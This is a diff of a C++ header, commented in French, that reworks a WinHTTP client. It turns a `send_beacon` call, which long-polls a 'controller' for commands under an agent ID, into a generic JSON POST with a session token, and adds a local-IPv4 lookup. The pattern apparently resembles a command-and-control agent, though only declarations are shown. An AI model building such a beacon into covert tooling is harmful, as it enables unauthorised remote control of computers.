@@ -2,17 +2,23 @@
 #include <string>
 
 enum class SendResult {
-    Ok,           // 200 : body = commande, ou vide s'il n'y a rien à faire
-    HttpError,    // réponse HTTP non-200 : error = code de statut
-    NetworkError  // échec WinHTTP : error = GetLastError()
+    Ok,           // la requete a abouti : status et body sont exploitables
+    NetworkError  // echec WinHTTP (DNS, connexion, timeout, reset) : error
 };
 
-struct BeaconReply {
+struct HttpReply {
     SendResult    result = SendResult::NetworkError;
-    std::string   body;
-    unsigned long error  = 0;
+    int           status = 0;    // code HTTP, si result == Ok
+    std::string   body;          // corps brut de la reponse
+    unsigned long error  = 0;    // GetLastError(), si NetworkError
 };
 
-// Envoie un beacon et bloque jusqu'à la réponse du contrôleur (long-poll).
-// La connexion HTTP est conservée entre deux appels (keep-alive).
-BeaconReply send_beacon(const std::string& agent_id, const std::string& message);
+// Envoie un corps JSON en POST sur `path` et bloque jusqu'a la reponse du
+// controleur (long-poll). Un `session_token` vide signifie "pas d'en-tete".
+// La connexion HTTP est conservee entre deux appels (keep-alive).
+HttpReply post_json(const std::wstring& path,
+                    const std::string& body,
+                    const std::string& session_token = std::string());
+
+// Premiere adresse IPv4 locale non-loopback, "0.0.0.0" si aucune.
+std::string local_ipv4();
